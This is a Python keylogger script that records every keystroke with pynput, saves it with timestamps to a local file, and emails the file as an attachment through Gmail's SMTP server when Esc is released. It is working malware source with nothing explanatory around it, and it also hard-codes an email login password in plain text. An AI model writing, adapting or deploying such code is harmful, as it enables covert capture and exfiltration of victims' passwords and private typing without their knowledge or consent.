from pynput.keyboard import Key, Listener
import datetime
import socket
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from email import message
from os.path import basename
from email.mime.application import MIMEApplication



count = 0

keys = []
firstletter = 0

def on_press(key):
    global keys, count

    print(key)

    keys.append(key)
    count += 1

    print(f"{key} pressed")

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    global firstletter
    with open("keylogs.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if 'Key.caps_lock' == str(key):
                f.write('CPS')
            if k.find("space") > 0:
                x = datetime.datetime.now()
                f.write('\n' + str(x.strftime('%c')) + " ")
            elif k.find("Key") == -1:
                if k.find("Key") == -1 and firstletter == 0:
                    x = datetime.datetime.now()
                    f.write(str(x.strftime('%c') + " " + k))
                    firstletter += 1
                else:
                    f.write(k)



def on_release(key):

    maillib = []
    if key == Key.esc:
        from_addr = 'sender.email@gmail.com'
        to_addr = 'receiver.email@gmail.com'
        subject = 'KeysFromHome'
        content = 'Input'

        msg = MIMEMultipart()

        msg['From'] = from_addr
        msg['To'] = to_addr
        msg['Subject'] = subject
        body = MIMEText(content, 'plain')
        msg.attach(body)

        filename = 'keylogs.txt'
        with open(filename, 'r') as f:
            attachment = MIMEApplication(f.read(), Name=basename(filename))
            attachment['Content-Disposition'] = 'attachment; filename="{}"'.format(basename(filename))

        msg.attach(attachment)

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(from_addr, 'freeguyssh2213!')
        server.send_message(msg, from_addr=from_addr, to_addrs=[to_addr])

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()



